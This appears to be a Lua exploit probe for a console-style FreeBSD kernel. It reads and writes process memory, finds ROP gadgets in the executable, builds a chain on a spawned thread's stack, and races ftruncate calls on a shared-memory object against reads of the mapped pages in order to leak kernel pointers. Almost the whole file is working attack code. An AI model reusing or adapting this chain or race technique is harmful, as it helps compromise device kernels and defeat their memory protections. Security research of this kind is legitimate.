-- CRASH_CLASS: HIGH
-- PROBE 1102c: SHM ftruncate race -- ZERO write_qword calls
--
-- 1102a/1102b crashed or produced binary because memory.write_qword prints
-- old value as binary to stdout. This version uses ONLY memory.write_dword.
-- All 64-bit values decomposed into explicit (lo, hi) number pairs.
-- Structural writes (tcb, param) also use dword pairs.

print("=== PROBE 1102c: SHM FTRUNCATE RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l
    if type(val) == "table" and val.h then h = val.h; l = val.l
    else h = 0; l = N(val) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

-- Decompose any value into (lo, hi) dwords
local function split(val)
    if val == nil then return 0, 0 end
    if type(val) == "number" then
        if val < 0 then val = val + 0x100000000 end
        if val < 0x100000000 then return val, 0 end
        local hi = math.floor(val / 0x100000000)
        local lo = val - hi * 0x100000000
        return lo, hi
    end
    if type(val) == "table" and val.h then
        local h, l = val.h, val.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return l, h
    end
    -- userdata (uint64) - parse string
    local s = tostring(val)
    local hs, ls = s:match("^0x(%x+)(%x%x%x%x%x%x%x%x)$")
    if hs then return tonumber(ls, 16), tonumber(hs, 16) end
    local n = tonumber(s)
    if n then return split(n) end
    return 0, 0
end

-- Write qword using two dword writes (NO binary output)
local function wq2(addr_n, lo, hi)
    wd(addr_n, lo)
    wd(addr_n + 4, hi or 0)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Get eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local tlo = rd(N(ib) + 0x108) or 0
local thi = rd(N(ib) + 0x10C) or 0
if tlo < 0 then tlo = tlo + 0x100000000 end
if thi < 0 then thi = thi + 0x100000000 end
print(string.format("eboot=0x%X%08X", thi, tlo))

local function eoff(off)
    local lo = tlo + off
    local hi = thi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return lo, hi
end

-- Parse fn_addr
local fn_str = tostring(syscall.pipe):match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local fn_lo, fn_hi = 0, 0
if fn_str then
    local hs, ls = fn_str:match("^0x(%x+)(%x%x%x%x%x%x%x%x)$")
    if hs then fn_hi = tonumber(hs, 16) or 0; fn_lo = tonumber(ls, 16) or 0
    else fn_hi = 0; fn_lo = tonumber(fn_str) or 0 end
end
print(string.format("fn_addr=0x%X%08X", fn_hi, fn_lo))

-- Gadget (lo, hi) pairs
local par_lo, par_hi = eoff(0x992)       -- pop_rax_ret
local pdr_lo, pdr_hi = eoff(0xC9DFE)     -- pop_rdi_ret
local psr_lo, psr_hi = eoff(0xD77D)      -- pop_rsi_ret
local mdr_lo, mdr_hi = eoff(0x92C67)     -- mov [rdi],rax; ret

-- Find jmp$ (EB FE)
local jmp_lo, jmp_hi = eoff(0x42)  -- fallback bare_ret
for off = 0, 0x100000, 2 do
    local b = rd(tlo + off)
    if b and (b % 0x10000) == 0xFEEB then
        jmp_lo, jmp_hi = eoff(off)
        print(string.format("jmp$=eboot+0x%X", off))
        break
    end
end

local sc455 = mk(455)
local sc480 = mk(480)
local sc482 = mk(482)
local sc477 = mk(477)

-- Create SHM object
local LARGE = 0x40000
local SMALL = 0x4000
local shm_fd = N(sc482(uint64(1), uint64(0x602), uint64(0x1FF)))
print("shm_fd=" .. shm_fd)
if shm_fd < 0 then print("FAILED") return end

N(sc480(uint64(shm_fd), uint64(LARGE)))
local map = sc477(uint64(0), uint64(LARGE), uint64(3), uint64(1), uint64(shm_fd), uint64(0))
local map_n = N(map)
print("map=" .. fmt(map))
if map_n == 0 then print("mmap FAILED") return end

-- Sentinels
for p = 0, 15 do
    wd(map_n + p * 0x4000, 0xAA000000 + p)
    wd(map_n + p * 0x4000 + 4, 0xBB000000 + p)
end

-- Child stack via mmap
local stack = sc477(uint64(0), uint64(0x10000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local stack_n = N(stack)
print("stack=" .. fmt(stack))

-- Fake TCB using DWORD writes only
local tcb = memory.alloc(0x1000)
local tcb_n = N(tcb)
local tcb_lo, tcb_hi = split(tcb)
-- Self-referencing pointer
wq2(tcb_n, tcb_lo, tcb_hi)

local fsb = memory.alloc(8)
local fsb_n = N(fsb)
wq2(fsb_n, tcb_lo, tcb_hi)

-- Done flag
local done_flag = memory.alloc(8)
local done_n = N(done_flag)
wq2(done_n, 0, 0)

-- RSP
local rsp = math.floor((stack_n + 0x10000) / 16) * 16 - 8

-- Write chain using DWORD PAIRS only
local ITERS = 200
local pos = 0

local function put(lo, hi)
    wd(rsp + pos * 8, lo)
    wd(rsp + pos * 8 + 4, hi or 0)
    pos = pos + 1
end

print(string.format("writing chain (%d iters)...", ITERS))

-- sysarch(165, SET_FSBASE=129, &fsb)
put(165, 0)              -- rax = 165
put(pdr_lo, pdr_hi)      -- pop rdi; ret
put(129, 0)              -- rdi = 129
put(psr_lo, psr_hi)      -- pop rsi; ret
put(fsb_n, 0)            -- rsi = &fsb (heap, <4GB ok? no - heap is >4GB)
-- Fix: fsb_n might be >4GB, need to split it
do
    local fl, fh = split(fsb_n)
    -- overwrite the last put
    pos = pos - 1
    put(fl, fh)
end
put(fn_lo, fn_hi)        -- syscall stub
put(par_lo, par_hi)      -- pop rax; ret

-- Ftruncate loop
for i = 1, ITERS do
    put(480, 0)
    put(pdr_lo, pdr_hi)
    put(shm_fd, 0)
    put(psr_lo, psr_hi)
    put(SMALL, 0)
    put(fn_lo, fn_hi)
    put(par_lo, par_hi)

    put(480, 0)
    put(pdr_lo, pdr_hi)
    put(shm_fd, 0)
    put(psr_lo, psr_hi)
    put(LARGE, 0)
    put(fn_lo, fn_hi)
    put(par_lo, par_hi)
end

-- Done marker
put(0xDEAD1102, 0)
put(pdr_lo, pdr_hi)
do local dl, dh = split(done_n); put(dl, dh) end
put(mdr_lo, mdr_hi)
put(jmp_lo, jmp_hi)

print(string.format("chain: %d entries (%d bytes)", pos, pos * 8))

-- Build thr_param using DWORD writes only
local tid_ptr = memory.alloc(8)
local tid_n = N(tid_ptr)
wq2(tid_n, 0, 0)

local param = memory.alloc(0x40)
local pm = N(param)
for i = 0, 0x3C, 4 do wd(pm + i, 0) end
-- +0x00: start_func = pop_rax_ret
wq2(pm, par_lo, par_hi)
-- +0x08: arg = 0 (already zeroed)
-- +0x10: stack_base
do local sl, sh = split(stack); wq2(pm + 0x10, sl, sh) end
-- +0x18: stack_size = 0x10000
wq2(pm + 0x18, 0x10000, 0)
-- +0x30: child_tid pointer
do local tl, th = split(tid_n); wq2(pm + 0x30, tl, th) end

print("launching child...")
local ok1, ret1 = pcall(function()
    return sc455(uint64(pm), uint64(0x38))
end)
print("thr_new=" .. (ok1 and tostring(N(ret1)) or "PCALL-FAIL"))

if not ok1 or N(ret1) ~= 0 then
    print("FAILED alive=" .. tostring(alive()))
    print("=== PROBE 1102c FAILED ===")
    return
end

local x = 0; for k = 1, 5000 do x = x + k end
local tid = rd(tid_n)
print("child_tid=" .. (tid or "nil"))

-- RACE: parent reads boundary pages
print("")
print("--- RACING ---")
local kptr_count = 0
local fault_count = 0
local anomaly_count = 0
local zero_count = 0
local read_count = 0

for round = 1, 2000 do
    for pg = 1, 7 do
        local val = rq(uint64(map_n + pg * 0x4000))
        read_count = read_count + 1
        if val == nil then
            fault_count = fault_count + 1
            if fault_count <= 5 then
                print(string.format("  [FAULT] r%d p%d", round, pg))
            end
        else
            local h, l = 0, 0
            if type(val) == "table" and val.h then h = val.h; l = val.l
            else l = N(val) end
            if h < 0 then h = h + 0x100000000 end
            if l < 0 then l = l + 0x100000000 end

            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                kptr_count = kptr_count + 1
                if kptr_count <= 20 then
                    print(string.format("  [KPTR!] r%d p%d: 0x%08X%08X", round, pg, h, l))
                end
            elseif h == 0 and l == 0 then
                zero_count = zero_count + 1
            else
                if l ~= (0xAA000000 + pg) or h ~= (0xBB000000 + pg) then
                    anomaly_count = anomaly_count + 1
                    if anomaly_count <= 20 then
                        print(string.format("  [ANOM] r%d p%d: 0x%08X%08X", round, pg, h, l))
                    end
                end
            end
        end
    end

    local df = rd(done_n)
    if df and df == 0xDEAD1102 then
        print(string.format("child done after round %d", round))
        break
    end

    -- Re-write sentinels
    for pg = 1, 7 do
        wd(map_n + pg * 0x4000, 0xAA000000 + pg)
        wd(map_n + pg * 0x4000 + 4, 0xBB000000 + pg)
    end
end

print("")
print(string.format("reads=%d faults=%d kptrs=%d anomalies=%d zeros=%d",
    read_count, fault_count, kptr_count, anomaly_count, zero_count))
print("alive=" .. tostring(alive()))
print("")
print("=== PROBE 1102c COMPLETE ===")
